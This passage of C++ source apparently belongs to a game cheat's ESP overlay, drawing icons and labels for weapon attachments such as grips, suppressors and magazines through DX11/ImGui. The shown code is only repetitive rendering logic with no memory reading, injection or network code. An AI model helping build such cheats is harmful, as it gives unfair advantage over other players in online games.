													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Vertical_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Vertical_Color[0], Setting::Esp_Item_Vertical_Color[1], Setting::Esp_Item_Vertical_Color[2], Setting::Esp_Item_Vertical_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_HalfGrip && Item.Name == u8"AR_HalfGrip")
												{
													if (Setting::Esp_Item_HalfGrip_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::HalfGrip, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::HalfGrip, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_HalfGrip_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_HalfGrip_Color[0], Setting::Esp_Item_HalfGrip_Color[1], Setting::Esp_Item_HalfGrip_Color[2], Setting::Esp_Item_HalfGrip_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_LightGrip && Item.Name == u8"AR_LightGrip")
												{
													if (Setting::Esp_Item_LightGrip_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::LightGrip, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::LightGrip, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_LightGrip_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_LightGrip_Color[0], Setting::Esp_Item_LightGrip_Color[1], Setting::Esp_Item_LightGrip_Color[2], Setting::Esp_Item_LightGrip_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Angled && Item.Name == u8"AR_Angled")
												{
													if (Setting::Esp_Item_Angled_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Angled, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Angled, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Angled_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Angled_Color[0], Setting::Esp_Item_Angled_Color[1], Setting::Esp_Item_Angled_Color[2], Setting::Esp_Item_Angled_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Lasersight && Item.Name == u8"AR_Lasersight")
												{
													if (Setting::Esp_Item_Lasersight_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Lasersight, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Lasersight, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Lasersight_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Lasersight_Color[0], Setting::Esp_Item_Lasersight_Color[1], Setting::Esp_Item_Lasersight_Color[2], Setting::Esp_Item_Lasersight_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_ThumbGrip && Item.Name == u8"AR_ThumbGrip")
												{
													if (Setting::Esp_Item_ThumbGrip_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::ThumbGrip, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::ThumbGrip, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_ThumbGrip_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_ThumbGrip_Color[0], Setting::Esp_Item_ThumbGrip_Color[1], Setting::Esp_Item_ThumbGrip_Color[2], Setting::Esp_Item_ThumbGrip_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Mid_FlashHider && Item.Name == u8"SMG_FlashHider")
												{
													if (Setting::Esp_Item_Mid_FlashHider_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::SMGFlashHider, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::SMGFlashHider, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Mid_FlashHider_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Mid_FlashHider_Color[0], Setting::Esp_Item_Mid_FlashHider_Color[1], Setting::Esp_Item_Mid_FlashHider_Color[2], Setting::Esp_Item_Mid_FlashHider_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Mid_Compensator && Item.Name == u8"SMG_Compensator")
												{
													if (Setting::Esp_Item_Mid_Compensator_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::SMGCompensator, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::SMGCompensator, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Mid_Compensator_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Mid_Compensator_Color[0], Setting::Esp_Item_Mid_Compensator_Color[1], Setting::Esp_Item_Mid_Compensator_Color[2], Setting::Esp_Item_Mid_Compensator_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Mid_Suppressor && Item.Name == u8"SMG_Suppressor")
												{
													if (Setting::Esp_Item_Mid_Suppressor_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::SMGSuppressor, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::SMGSuppressor, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Mid_Suppressor_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Mid_Suppressor_Color[0], Setting::Esp_Item_Mid_Suppressor_Color[1], Setting::Esp_Item_Mid_Suppressor_Color[2], Setting::Esp_Item_Mid_Suppressor_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Large_FlashHider && Item.Name == u8"AR_FlashHider")
												{
													if (Setting::Esp_Item_Large_FlashHider_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::ARFlashHider, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::ARFlashHider, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Large_FlashHider_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Large_FlashHider_Color[0], Setting::Esp_Item_Large_FlashHider_Color[1], Setting::Esp_Item_Large_FlashHider_Color[2], Setting::Esp_Item_Large_FlashHider_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Large_Compensator && Item.Name == u8"AR_Compensator")
												{
													if (Setting::Esp_Item_Large_Compensator_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::ARCompensator, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::ARCompensator, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Large_Compensator_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Large_Compensator_Color[0], Setting::Esp_Item_Large_Compensator_Color[1], Setting::Esp_Item_Large_Compensator_Color[2], Setting::Esp_Item_Large_Compensator_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Large_Suppressor && Item.Name == u8"AR_Suppressor")
												{
													if (Setting::Esp_Item_Large_Suppressor_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::ARSuppressor, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::ARSuppressor, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Large_Suppressor_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Large_Suppressor_Color[0], Setting::Esp_Item_Large_Suppressor_Color[1], Setting::Esp_Item_Large_Suppressor_Color[2], Setting::Esp_Item_Large_Suppressor_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Taktik && Item.Name == u8"Chekpad_AR")
												{
													if (Setting::Esp_Item_Taktik_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::ARCheckPad, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::ARCheckPad, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Taktik_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Taktik_Color[0], Setting::Esp_Item_Taktik_Color[1], Setting::Esp_Item_Taktik_Color[2], Setting::Esp_Item_Taktik_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Sniper_FlashHider && Item.Name == u8"Sniper_FlashHider")
												{
													if (Setting::Esp_Item_Sniper_FlashHider_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::SniperFlashHider, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::SniperFlashHider, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Sniper_FlashHider_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Sniper_FlashHider_Color[0], Setting::Esp_Item_Sniper_FlashHider_Color[1], Setting::Esp_Item_Sniper_FlashHider_Color[2], Setting::Esp_Item_Sniper_FlashHider_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Sniper_Compensator && Item.Name == u8"Sniper_Compensator")
												{
													if (Setting::Esp_Item_Sniper_Compensator_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::SniperCompensator, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::SniperCompensator, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Sniper_Compensator_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Sniper_Compensator_Color[0], Setting::Esp_Item_Sniper_Compensator_Color[1], Setting::Esp_Item_Sniper_Compensator_Color[2], Setting::Esp_Item_Sniper_Compensator_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Sniper_Suppressor && Item.Name == u8"Sniper_Suppressor")
												{
													if (Setting::Esp_Item_Sniper_Suppressor_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::SniperSuppressor, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::SniperSuppressor, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Sniper_Suppressor_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Sniper_Suppressor_Color[0], Setting::Esp_Item_Sniper_Suppressor_Color[1], Setting::Esp_Item_Sniper_Suppressor_Color[2], Setting::Esp_Item_Sniper_Suppressor_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Chekpad_Sniper && Item.Name == u8"Chekpad_Sniper")
												{
													if (Setting::Esp_Item_Chekpad_Sniper_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::SniperCheckPad, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::SniperCheckPad, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Chekpad_Sniper_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Chekpad_Sniper_Color[0], Setting::Esp_Item_Chekpad_Sniper_Color[1], Setting::Esp_Item_Chekpad_Sniper_Color[2], Setting::Esp_Item_Chekpad_Sniper_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Duckbill && Item.Name == u8"ShotGun_DuckBill")
												{
													if (Setting::Esp_Item_Duckbill_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::DuckBill, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::DuckBill, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Duckbill_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Duckbill_Color[0], Setting::Esp_Item_Duckbill_Color[1], Setting::Esp_Item_Duckbill_Color[2], Setting::Esp_Item_Duckbill_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Choke && Item.Name == u8"ShotGun_Choke")
												{
													if (Setting::Esp_Item_Choke_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Choke, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Choke, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Choke_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Choke_Color[0], Setting::Esp_Item_Choke_Color[1], Setting::Esp_Item_Choke_Color[2], Setting::Esp_Item_Choke_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Sniper_Quick_Extended && Item.Name == u8"Sniper_Quick_Extended")
												{
													if (Setting::Esp_Item_Sniper_Quick_Extended_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::SniperQExtended, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::SniperQExtended, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Sniper_Quick_Extended_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Sniper_Quick_Extended_Color[0], Setting::Esp_Item_Sniper_Quick_Extended_Color[1], Setting::Esp_Item_Sniper_Quick_Extended_Color[2], Setting::Esp_Item_Sniper_Quick_Extended_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Sniper_Extended && Item.Name == u8"Sniper_Extended")
												{
													if (Setting::Esp_Item_Sniper_Extended_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::SniperExtended, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::SniperExtended, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Sniper_Extended_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Sniper_Extended_Color[0], Setting::Esp_Item_Sniper_Extended_Color[1], Setting::Esp_Item_Sniper_Extended_Color[2], Setting::Esp_Item_Sniper_Extended_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_Sniper_Quick && Item.Name == u8"Sniper_Quick")
												{
													if (Setting::Esp_Item_Sniper_Quick_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::SniperQuick, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::SniperQuick, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Sniper_Quick_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Sniper_Quick_Color[0], Setting::Esp_Item_Sniper_Quick_Color[1], Setting::Esp_Item_Sniper_Quick_Color[2], Setting::Esp_Item_Sniper_Quick_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_AR_Quick && Item.Name == u8"AR_Quick")
												{
													if (Setting::Esp_Item_AR_Quick_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::ARQuick, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::ARQuick, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_AR_Quick_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_AR_Quick_Color[0], Setting::Esp_Item_AR_Quick_Color[1], Setting::Esp_Item_AR_Quick_Color[2], Setting::Esp_Item_AR_Quick_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_AR_Quick_Extended && Item.Name == u8"AR_Quick_Extended")
												{
													if (Setting::Esp_Item_AR_Quick_Extended_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::ARQExtended, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::ARQExtended, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_AR_Quick_Extended_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_AR_Quick_Extended_Color[0], Setting::Esp_Item_AR_Quick_Extended_Color[1], Setting::Esp_Item_AR_Quick_Extended_Color[2], Setting::Esp_Item_AR_Quick_Extended_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_AR_Extended && Item.Name == u8"AR_Extended")
												{
													if (Setting::Esp_Item_AR_Extended_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::ARExtended, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::ARExtended, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_AR_Extended_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_AR_Extended_Color[0], Setting::Esp_Item_AR_Extended_Color[1], Setting::Esp_Item_AR_Extended_Color[2], Setting::Esp_Item_AR_Extended_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_SMG_Quick_Extended && Item.Name == u8"SMG_Quick_Extended")
												{
													if (Setting::Esp_Item_SMG_Quick_Extended_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::SMGQExtended, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::SMGQExtended, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_SMG_Quick_Extended_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_SMG_Quick_Extended_Color[0], Setting::Esp_Item_SMG_Quick_Extended_Color[1], Setting::Esp_Item_SMG_Quick_Extended_Color[2], Setting::Esp_Item_SMG_Quick_Extended_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_SMG_Extended && Item.Name == u8"SMG_Extended")
												{
													if (Setting::Esp_Item_SMG_Extended_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::SMGExtended, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::SMGExtended, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_SMG_Extended_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_SMG_Extended_Color[0], Setting::Esp_Item_SMG_Extended_Color[1], Setting::Esp_Item_SMG_Extended_Color[2], Setting::Esp_Item_SMG_Extended_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_SMG_Quick && Item.Name == u8"SMG_Quick")
												{
													if (Setting::Esp_Item_SMG_Quick_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::SMGQuick, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::SMGQuick, Screen.X - 50, Screen.Y - 25, 40, 40);
															//continue;
														}
													}
													//else
													//{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_SMG_Quick_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_SMG_Quick_Color[0], Setting::Esp_Item_SMG_Quick_Color[1], Setting::Esp_Item_SMG_Quick_Color[2], Setting::Esp_Item_SMG_Quick_Color[3]), true);
													continue;
													//}
												}
												if (Setting::Esp_Item_CrossBow_Quick && Item.Name == u8"CrossBow_Quick")
												{
													if (Setting::Esp_Item_CrossBow_Quick_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
